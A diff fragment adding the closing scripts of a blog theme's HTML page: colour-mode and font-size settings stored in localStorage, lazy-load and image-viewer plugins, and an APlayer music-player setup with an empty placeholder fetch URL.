+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
+
+<script src="/js/plugins/dist/lazyload.min.js"></script>
+
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
+
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
+
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
